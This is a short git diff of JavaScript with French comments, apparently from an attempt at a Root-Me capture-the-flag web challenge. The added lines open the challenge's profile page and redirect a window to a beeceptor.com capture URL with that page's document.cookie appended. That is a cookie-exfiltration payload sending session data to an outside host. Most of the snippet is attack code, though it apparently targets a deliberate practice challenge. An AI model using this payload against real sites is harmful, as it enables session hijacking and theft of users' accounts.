@@ -37,8 +37,9 @@ setTimeout(() => {
       .then(data => console.log('Réponse du serveur:', data))
       .catch(error => console.error('Erreur lors de la requête:', error));
       */
-
-    newWindow.location = "https://volatile.free.beeceptor.com"
+    const newWindow2 = window.open('http://challenge01.root-me.org:58003/profile');
+    newWindow.location = "https://volatile.free.beeceptor.com/c?" + newWindow2.document.cookie
+        
     } catch (error) {
       console.error('Erreur lors de l\'accès au contenu:', error);
       // Gestion de l'erreur de politique de même origine (CORS)
